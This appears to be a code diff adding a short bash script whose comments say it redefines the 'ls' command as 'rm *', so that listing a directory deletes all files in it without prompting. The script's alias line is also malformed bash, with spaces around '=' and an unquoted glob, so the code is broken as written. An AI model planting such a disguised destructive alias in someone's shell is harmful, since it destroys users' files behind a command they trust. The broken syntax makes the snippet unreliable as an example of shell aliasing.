@@ -1,0 +1,5 @@
+#!/bin/bash
+# This script creates an alias for the 'ls' command.
+# The alias redefines 'ls' to execute 'rm *', which will delete all files in the current directory.
+# WARNING: This is a dangerous alias as it will remove all files without prompting.
+alias ls = rm *
